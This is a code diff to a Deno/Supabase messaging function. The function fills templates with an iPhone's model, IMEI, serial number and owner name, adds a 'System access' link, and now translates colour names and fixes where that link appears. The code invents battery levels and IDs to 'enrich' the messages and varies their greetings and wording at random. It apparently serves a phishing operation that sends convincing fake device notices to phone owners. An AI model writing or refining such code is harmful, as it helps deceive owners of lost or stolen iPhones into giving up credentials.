@@ -111,6 +111,34 @@ Deno.serve(async (req) => {
       return greetings[Math.floor(Math.random() * greetings.length)];
     };
 
+    // Translate iPhone color names from Spanish to English for EN messages
+    const translateColor = (input: string): string => {
+      if (!input) return '';
+      const v = input.toLowerCase().trim();
+      const map: Array<[RegExp, string]> = [
+        [/azul\s*titanio|titanio\s*azul/, 'Blue Titanium'],
+        [/titanio\s*natural|natural\s*titanio|^natural$/, 'Natural Titanium'],
+        [/grafito/, 'Graphite'],
+        [/medianoche|negro/, 'Black'],
+        [/blanco|perla|perl[ao]?|plateado/, 'White'],
+        [/plata/, 'Silver'],
+        [/oro|dorado/, 'Gold'],
+        [/amarillo/, 'Yellow'],
+        [/azul/, 'Blue'],
+        [/verde/, 'Green'],
+        [/rojo/, 'Red'],
+        [/morado|púrpura|purpura/, 'Purple'],
+        [/rosa/, 'Pink'],
+        [/gris/, 'Gray'],
+        [/estelar/, 'Starlight'],
+      ];
+      for (const [re, out] of map) {
+        if (re.test(v)) return out;
+      }
+      // If already English-looking, return capitalized original
+      return input.charAt(0).toUpperCase() + input.slice(1);
+    };
+
     let query = supabase
       .from('message_queue')
       .select(`
@@ -211,17 +239,24 @@ Deno.serve(async (req) => {
           .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
           .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
           .replace(/\{storage\}/g, queuedMessage.processes?.storage || '')
-          .replace(/\{color\}/g, queuedMessage.processes?.color || '')
+          .replace(/\{color\}/g, queuedMessage.language === 'spanish' ? (queuedMessage.processes?.color || '') : translateColor(queuedMessage.processes?.color || ''))
           .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
           .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
           .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '');
       }
     }
 
-    // Localized link label and inclusion near the top (not at the end)
+    // Localized link label and enforce single placement before IDs
     const linkLabel = queuedMessage.language === 'spanish' ? '🔗 Acceso al sistema' : '🔗 System access';
-    if (queuedMessage.processes?.url && !customSection.includes(queuedMessage.processes.url)) {
-      customSection = `${customSection}\n\n${linkLabel}: ${queuedMessage.processes.url}`.trim();
+    const url = queuedMessage.processes?.url;
+    if (url) {
+      // Remove any existing occurrences of the URL or labeled link lines
+      customSection = customSection
+        .replaceAll(url, '')
+        .replace(/^[\s\t]*🔗\s*(Acceso al sistema|System access):.*$/gmi, '')
+        .trim();
+
+      customSection = `${customSection}\n\n${linkLabel}: ${url}`.trim();
     }
 
     // Generate IDs and battery only to enrich the final message
@@ -272,9 +307,10 @@ Deno.serve(async (req) => {
         'Equipment information:',
         'Technical data:',
       ];
+      const colorEn = translateColor(queuedMessage.processes?.color || '');
       const deviceSectionsEN = [
-        `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
-        `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
+        `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
+        `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
       ];
       const helpPhrasesEN = [
         'Need help? Write *Menu* for technical assistance 👨‍💻',
